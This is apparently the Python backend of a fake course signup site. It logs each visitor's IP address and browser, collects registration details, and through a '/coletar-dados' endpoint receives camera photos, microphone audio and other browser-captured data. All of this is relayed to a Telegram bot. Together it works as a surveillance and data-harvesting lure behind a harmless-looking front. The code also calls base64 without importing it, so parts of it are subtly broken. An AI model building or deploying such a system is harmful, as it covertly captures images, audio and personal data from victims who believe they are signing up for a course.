from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import sqlite3
from urllib.parse import urlparse, parse_qs
from config import Config
from database import Database
from telegram_bot import TelegramBot
import os
from datetime import datetime

class CourseHandler(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.db = Database(Config.DB_PATH)
        self.bot = TelegramBot()
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        # Registrar clique
        self.registrar_clique()
        
        # Servir arquivos estáticos
        if self.path.startswith('/styles/') or self.path.startswith('/js/'):
            super().do_GET()
            return
        
        # Rotas principais
        if self.path == '/':
            self.serve_file('index.html')
        elif self.path == '/categorias':
            self.serve_file('categorias.html')
        elif self.path == '/cadastro':
            self.serve_file('cadastro.html')
        elif self.path == '/permissoes':
            self.serve_file('permissoes.html')
        elif self.path == '/confirmacao':
            self.serve_file('confirmacao.html')
        elif self.path == '/get-categorias':
            self.send_categorias()
        else:
            self.serve_file('index.html')
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        if self.path == '/cadastrar':
            self.processar_cadastro(post_data)
        elif self.path == '/coletar-dados':
            self.processar_dados_coletados(post_data)
        else:
            self.send_error(404)
    
    def registrar_clique(self):
        client_ip = self.get_client_ip()
        user_agent = self.headers.get('User-Agent', '')
        pagina = self.path if self.path != '/' else 'index'
        
        dados_cliente = {
            'ip': client_ip,
            'user_agent': user_agent,
            'timestamp': datetime.now().isoformat()
        }
        
        # Registrar no banco
        self.db.registrar_clique(pagina, client_ip, user_agent)
        
        # Notificar Telegram
        self.bot.notificar_clique(pagina, dados_cliente)
    
    def get_client_ip(self):
        if 'X-Forwarded-For' in self.headers:
            return self.headers['X-Forwarded-For'].split(',')[0]
        elif 'X-Real-IP' in self.headers:
            return self.headers['X-Real-IP']
        else:
            return self.client_address[0]
    
    def serve_file(self, filename):
        try:
            with open(filename, 'rb') as f:
                content = f.read()
            
            self.send_response(200)
            if filename.endswith('.html'):
                self.send_header('Content-type', 'text/html; charset=utf-8')
            elif filename.endswith('.css'):
                self.send_header('Content-type', 'text/css')
            elif filename.endswith('.js'):
                self.send_header('Content-type', 'application/javascript')
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self.send_error(404)
    
    def send_categorias(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(Config.CATEGORIAS).encode())
    
    def processar_cadastro(self, post_data):
        try:
            dados = json.loads(post_data)
            
            # Adicionar informações do cliente
            dados['ip'] = self.get_client_ip()
            dados['user_agent'] = self.headers.get('User-Agent', '')
            dados['data'] = datetime.now().isoformat()
            
            # Salvar no banco
            lead_id = self.db.salvar_lead(dados)
            
            # Notificar Telegram
            self.bot.notificar_novo_lead(dados)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'success': True, 'lead_id': lead_id}).encode())
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
    
    def processar_dados_coletados(self, post_data):
        try:
            dados = json.loads(post_data)
            lead_id = dados.get('lead_id')
            tipo_dado = dados.get('tipo')
            dados_coletados = dados.get('dados')
            
            # Salvar no banco
            self.db.salvar_dados_coletados(lead_id, tipo_dado, json.dumps(dados_coletados))
            
            # Notificar Telegram
            lead_info = f"ID: {lead_id}"
            self.bot.enviar_dados_coletados(tipo_dado, dados_coletados, lead_info)
            
            # Se for arquivo de mídia, enviar arquivo
            if tipo_dado == "camera" and 'data' in dados_coletados:
                self.enviar_arquivo_telegram(dados_coletados['data'], f"foto_{lead_id}.jpg", "Foto capturada")
            elif tipo_dado == "microfone" and 'data' in dados_coletados:
                self.enviar_arquivo_telegram(dados_coletados['data'], f"audio_{lead_id}.wav", "Áudio capturado")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'success': True}).encode())
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
    
    def enviar_arquivo_telegram(self, data_url, filename, caption):
        try:
            # Converter data URL para bytes
            if data_url.startswith('data:'):
                header, encoded = data_url.split(',', 1)
                file_data = base64.b64decode(encoded)
                self.bot.enviar_arquivo(file_data, filename, caption)
        except Exception as e:
            print(f"Erro ao enviar arquivo: {e}")

def run_server():
    server = HTTPServer((Config.HOST, Config.PORT), CourseHandler)
    print(f"Servidor rodando em http://localhost:{Config.PORT}")
    server.serve_forever()

if __name__ == '__main__':
    run_server()
